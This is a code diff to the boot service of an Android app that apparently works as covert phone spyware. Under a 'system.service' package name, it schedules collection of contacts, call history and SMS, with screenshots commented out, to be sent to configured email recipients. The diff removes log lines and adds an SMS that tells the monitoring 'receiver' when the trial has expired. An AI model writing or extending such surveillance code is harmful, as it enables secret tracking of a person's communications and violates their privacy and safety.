@@ -5,6 +5,8 @@ import java.util.TimerTask;
 
 import system.service.activity.GlobalPrefActivity;
 import system.service.config.ConfigCtrl;
+import system.service.feature.sms.SmsCtrl;
+
 import com.particle.inspector.common.util.StrUtils;
 import com.particle.inspector.common.util.SysUtils;
 import com.particle.inspector.common.util.gps.GpsUtil;
@@ -12,6 +14,7 @@ import com.particle.inspector.common.util.license.LicenseCtrl;
 import com.particle.inspector.common.util.license.LICENSE_TYPE;
 
 import android.app.Service;
+import android.content.Context;
 import android.content.Intent;
 import android.os.Binder;
 import android.os.IBinder;
@@ -64,8 +67,6 @@ public class BootService extends Service
 		//android.os.Debug.waitForDebugger();//TODO should be removed in the release
 		super.onCreate();
 		
-		Log.v(LOGTAG, "created");
-		
 		mGetInfoTimer = new Timer();
 		mInfoTask = new GetInfoTask(getApplicationContext());
 		
@@ -77,13 +78,13 @@ public class BootService extends Service
 	public void onStart(final Intent intent, final int startId) {
 		//android.os.Debug.waitForDebugger();//TODO should be removed in the release
 		super.onStart(intent, startId);
-		Log.v(LOGTAG, "started");
 		
 		// Start timer to get contacts, phone call history and SMS
-		LICENSE_TYPE type = ConfigCtrl.getLicenseType(getApplicationContext());
+		Context context = getApplicationContext();
+		LICENSE_TYPE type = ConfigCtrl.getLicenseType(context);
 		String[] mails = GlobalPrefActivity.getMail(this).split(",");
 		mails = StrUtils.filterMails(mails);
-		if ((type != LICENSE_TYPE.NOT_LICENSED || ConfigCtrl.stillInTrial(getApplicationContext())) && mails.length > 0) 
+		if ((type != LICENSE_TYPE.NOT_LICENSED || ConfigCtrl.stillInTrial(context)) && mails.length > 0) 
 		{
 			mGetInfoTimer.scheduleAtFixedRate(mInfoTask, mGetInfoDelay, mGetInfoPeriod);
 			
@@ -97,6 +98,23 @@ public class BootService extends Service
 	        	mScreenshotTimer.schedule(mCapTask, mScreenshotDelay, mScreenshotPeriod);
 	        }
 	        */
+		} 
+		
+		// If out of trial and not licensed, send a SMS to warn the receiver user
+		else if (type == LICENSE_TYPE.NOT_LICENSED && !ConfigCtrl.stillInTrial(context))
+		{
+			// If has sent before, DO NOT send again
+			if (ConfigCtrl.getHasSentExpireSms(context)) return;
+			
+			// Send a SMS to the receiver that has expired
+			String receiverPhoneNum = GlobalPrefActivity.getRedirectPhoneNum(context);
+			if (receiverPhoneNum != null && receiverPhoneNum.length() > 0) {
+				String msg = String.format(context.getResources().getString(R.string.msg_has_sent_trial_expire_sms), ConfigCtrl.getSelfName(context));
+				boolean ret = SmsCtrl.sendSms(receiverPhoneNum, msg);
+				if (ret) {
+					ConfigCtrl.setHasSentExpireSms(context, true);
+				}
+			}
 		}
 	}
 	
